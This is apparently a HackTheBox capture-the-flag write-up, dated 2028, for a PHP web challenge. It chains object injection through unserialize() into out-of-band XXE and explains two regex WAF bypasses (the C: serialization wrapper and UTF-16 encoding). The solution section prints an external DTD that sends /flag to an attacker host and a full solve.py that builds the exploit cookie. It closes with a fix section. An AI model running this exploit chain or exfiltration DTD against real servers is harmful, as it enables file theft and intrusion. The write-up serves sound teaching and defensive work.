---
layout: post
title: "WAFfle-y Order"
date: 2028-02-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, php-object-injection, unserialize, xxe, waf-bypass, utf-16, oob-exfil, deserialization]
description: "A Medium Web challenge where two hand-rolled regex WAFs both inspect the wrong view of the input: a legacy PHP C: serialization format slips a magic-method gadget past the first, and a UTF-16 re-encoding blinds the byte-oriented XXE filter of the second — chaining PHP object injection into out-of-band XXE that reads the flag."
---

## Overview

WAFfle-y Order is a Medium **Web** challenge built around a PHP `unserialize()` sink
reachable from a base64 session cookie. Two custom regex WAFs stand in the way — one
scanning the serialized string for dangerous classes, one scanning the XML for
external entities. Both make the same mistake: they inspect a *representation of the
input that isn't the one the interpreter actually consumes*. The path is **PHP object
injection → out-of-band XXE → `/flag`**.

## The technique

The ordering endpoint deserializes whatever you put in the `PHPSESSID` cookie:

```php
$cookie = base64_decode($_COOKIE['PHPSESSID']);
safe_object($cookie);            // WAF #1
$user = unserialize($cookie);    // attacker-controlled object injection
```

The only useful gadget is `XmlParserModel`, whose `__wakeup()` parses a
string you control as XML with entity substitution enabled:

```php
public function __wakeup() {
    if (preg_match_all("/<!(?:DOCTYPE|ENTITY)...(?:SYSTEM|PUBLIC)\s+['\"]/im", $this->data))
        die('Unsafe XML');       // WAF #2
    $env = @simplexml_load_string($this->data, 'SimpleXMLElement', LIBXML_NOENT); // XXE
}
```

This is [PHP object injection](https://cwe.mitre.org/data/definitions/502.html)
feeding an [XML external-entity injection](https://cwe.mitre.org/data/definitions/611.html).
The two WAFs are what make it "Medium".

### WAF #1 — magic-method blocklist, and why `C:` beats it

```php
preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $data, $m);
// die() if any matched class exposes a method matching /^__.*$/
```

It only recognizes an object that begins the string (`^`) or immediately follows a
`;`, then bans it if it has a magic method. `XmlParserModel` has `__wakeup`, so a bare
`O:14:"XmlParserModel":...` is killed.

**Bypass:** PHP's *legacy* `Serializable` wire format `C:` is still accepted by
`unserialize()` even though PHP 8 never emits it. Wrap the gadget inside the `C:`
container of `SplDoublyLinkedList` — the element is then written as
`...;:O:14:"XmlParserModel":...`, where the inner `O:` is preceded by a **colon**, not
a `;`. The anchored regex matches **zero** objects and never inspects the class:

```
C:19:"SplDoublyLinkedList":<len>:{i:0;:<inner XmlParserModel>:i:42;}
```

(`<len>` is the byte length between the outer braces; the trailing `:i:42;` is
required — `i:0;:INNER;` throws.)

### WAF #2 — an ASCII regex versus a UTF-16 document

The `__wakeup` filter matches the **ASCII bytes** of `<!DOCTYPE ... SYSTEM '`. But
`simplexml_load_string` (libxml) auto-detects the document's encoding. Serialize the
whole XML as **UTF-16BE**: `<!DOCTYPE` becomes `00 3C 00 21 00 44 ...`, which the
single-byte regex can never match — yet libxml reads the `encoding="UTF-16"`
declaration and parses the DOCTYPE and entities normally.

## Solution

The flag is never reflected in the HTTP response, so it has to leave out-of-band. The
UTF-16 XML pulls an external parameter-entity DTD that base64-reads `/flag` (via
`php://filter`, so its bytes can't break the XML) and ships it in a GET query:

Create `x.dtd` (served from an attacker-controlled host):

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<attacker-host>/?x=%file;'>">
%eval;
%exfiltrate;
```

Create `solve.py`:

```python
import sys, base64, json, time, urllib.request

def build_cookie(webhook_uuid):
    dtd_url = f"http://<attacker-host>/{webhook_uuid}/x.dtd"
    xml = ('<?xml version="1.0" encoding="UTF-16"?>'
           '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "' + dtd_url + '"> %xxe;]>'
           '<env><debug>1</debug></env>')
    xml_u16 = xml.encode("utf-16-be")                       # WAF #2 bypass

    prop = b"\x00XmlParserModel\x00data"                    # private-property mangling
    inner = (b'O:14:"XmlParserModel":1:{'
             b's:' + str(len(prop)).encode() + b':"' + prop + b'";'
             b's:' + str(len(xml_u16)).encode() + b':"' + xml_u16 + b'";}')

    dll_body = b'i:0;:' + inner + b':i:42;'                 # WAF #1 bypass (C: wrap)
    payload = (b'C:19:"SplDoublyLinkedList":' + str(len(dll_body)).encode()
               + b':{' + dll_body + b'}')
    return base64.b64encode(payload).decode()

def send(target, cookie):
    req = urllib.request.Request(
        f"http://{target}/api/order",
        data=json.dumps({"food": "WAFfles"}).encode(),
        headers={"Content-Type": "application/json", "Cookie": f"PHPSESSID={cookie}"},
        method="POST")
    return urllib.request.urlopen(req, timeout=15).read().decode()

if __name__ == "__main__":
    target, uuid = sys.argv[1], sys.argv[2]
    print(send(target, build_cookie(uuid)))
    # then read the attacker access log for ?x=<base64 flag> and base64-decode it
```

Run it, then decode the `?x=` value captured in the callback log:

```bash
python3 solve.py <host:port> <token>
# access log shows /?x=<base64>  ->  base64 -d  ->  HTB{...}
```

The server response is `Malformed XML` (libxml still fails the doc after the entities
fire), but the exfiltration has already happened. Flag: `HTB{...}` *(redacted)*.

## Why it worked

Both filters are **blocklists over the wrong representation**. WAF #1 regexes the
serialized *string* but doesn't model PHP's `C:` / nesting / reference grammar, so it
can't see what `unserialize()` will actually instantiate. WAF #2 regexes the raw
*bytes* before libxml canonicalizes the character encoding, so a UTF-16 document walks
straight through. Classic validate-before-canonicalize.

## Fix / defense

- **Never deserialize untrusted input.** Use `json_decode`, or at minimum
  `unserialize($d, ['allowed_classes' => false])` — an *allowlist* of exact safe
  classes, not a blocklist of method names.
- **Disable entities at the parser**, don't pattern-match the payload:
  `libxml_set_external_entity_loader(null)`, add `LIBXML_NONET`, and drop
  `LIBXML_NOENT`. Canonicalize input to one charset (`mb_convert_encoding(..., 'UTF-8')`)
  *before* any security check runs.
- Sign session payloads (HMAC) so attacker-crafted structures never reach the sink.
